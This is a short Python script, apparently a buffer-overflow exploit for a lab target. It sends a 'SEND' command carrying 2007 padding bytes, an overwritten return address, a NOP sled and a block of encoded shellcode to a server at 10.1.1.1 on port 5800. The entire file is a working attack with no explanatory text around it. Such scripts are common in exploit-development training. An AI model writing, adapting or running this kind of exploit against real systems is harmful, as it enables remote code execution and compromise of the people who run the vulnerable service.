import socket

IP = "10.1.1.1"
PORT = 5800

SHELLCODE = (
    "\xbf\xc8\x7e\x14\x2f\xdd\xc6\xd9\x74\x24\xf4\x5a\x31\xc9"
    "\xb1\x52\x83\xea\xfc\x31\x7a\x0e\x03\xb2\x70\xf6\xda\xbe"
    "\x65\x74\x24\x3e\x76\x19\xac\xdb\x47\x19\xca\xa8\xf8\xa9"
    "\x98\xfc\xf4\x42\xcc\x14\x8e\x27\xd9\x1b\x27\x8d\x3f\x12"
    "\xb8\xbe\x7c\x35\x3a\xbd\x50\x95\x03\x0e\xa5\xd4\x44\x73"
    "\x44\x84\x1d\xff\xfb\x38\x29\xb5\xc7\xb3\x61\x5b\x40\x20"
    "\x31\x5a\x61\xf7\x49\x05\xa1\xf6\x9e\x3d\xe8\xe0\xc3\x78"
    "\xa2\x9b\x30\xf6\x35\x4d\x09\xf7\x9a\xb0\xa5\x0a\xe2\xf5"
    "\x02\xf5\x91\x0f\x71\x88\xa1\xd4\x0b\x56\x27\xce\xac\x1d"
    "\x9f\x2a\x4c\xf1\x46\xb9\x42\xbe\x0d\xe5\x46\x41\xc1\x9e"
    "\x73\xca\xe4\x70\xf2\x88\xc2\x54\x5e\x4a\x6a\xcd\x3a\x3d"
    "\x93\x0d\xe5\xe2\x31\x46\x08\xf6\x4b\x05\x45\x3b\x66\xb5"
    "\x95\x53\xf1\xc6\xa7\xfc\xa9\x40\x84\x75\x74\x97\xeb\xaf"
    "\xc0\x07\x12\x50\x31\x0e\xd1\x04\x61\x38\xf0\x24\xea\xb8"
    "\xfd\xf0\xbd\xe8\x51\xab\x7d\x58\x12\x1b\x16\xb2\x9d\x44"
    "\x06\xbd\x77\xed\xad\x44\x10\x18\x33\x47\xe2\x74\x31\x47"
    "\xe3\x3f\xbc\xa1\x89\x2f\xe9\x7a\x26\xc9\xb0\xf0\xd7\x16"
    "\x6f\x7d\xd7\x9d\x9c\x82\x96\x55\xe8\x90\x4f\x96\xa7\xca"
    "\xc6\xa9\x1d\x62\x84\x38\xfa\x72\xc3\x20\x55\x25\x84\x97"
    "\xac\xa3\x38\x81\x06\xd1\xc0\x57\x60\x51\x1f\xa4\x6f\x58"
    "\xd2\x90\x4b\x4a\x2a\x18\xd0\x3e\xe2\x4f\x8e\xe8\x44\x26"
    "\x60\x42\x1f\x95\x2a\x02\xe6\xd5\xec\x54\xe7\x33\x9b\xb8"
    "\x56\xea\xda\xc7\x57\x7a\xeb\xb0\x85\x1a\x14\x6b\x0e\x3a"
    "\xf7\xb9\x7b\xd3\xae\x28\xc6\xbe\x50\x87\x05\xc7\xd2\x2d"
    "\xf6\x3c\xca\x44\xf3\x79\x4c\xb5\x89\x12\x39\xb9\x3e\x12"
    "\x68"
)

def exploit():
    shellcode_bytes = SHELLCODE.encode('latin-1')
    
    payload = (
        b"A" * 2007 +
        b"\xa0\x12\x50\x62" +
        b"\x90" * 32 +
        shellcode_bytes
    )
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IP, PORT))
        s.recv(1024)
        print("Sending payload...")
        s.sendall(b"SEND " + payload + b"\r\n")
    print("Done")

if __name__ == "__main__":
    exploit()